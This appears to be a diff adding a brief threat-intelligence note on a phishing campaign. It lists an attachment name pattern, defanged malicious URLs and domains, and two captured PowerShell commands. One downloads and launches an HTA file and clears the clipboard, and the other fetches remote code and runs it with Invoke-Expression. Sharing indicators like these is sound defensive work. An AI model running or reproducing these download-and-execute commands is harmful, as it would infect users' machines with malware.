@@ -1,0 +1,13 @@
+Email:
+Attachment: may_[0-9]{6}
+
+IOCs 
+hxxps://rockcreekdds[.]com/wp-content/1.hta
+hxxp://flexiblemaria[.]com/iinkqrwu
+hxxp://flexiblemaria[.]com/umkglnks
+flexiblemaria[.]com
+
+Commands:
+cmd /c start /min powershell $r7 = 'c:\users\public\vb.hta';invoke-webrequest -uri hxxps://www[.]rockcreekdds[.]com/wp-content/1.hta -outfile $r7;start-process $r7;Set-Clipboard -Value ' ';exit;
+
+powershell.exe -Command Invoke-Expression (irm -Uri 'flexiblemaria[.]com/umkglnks')
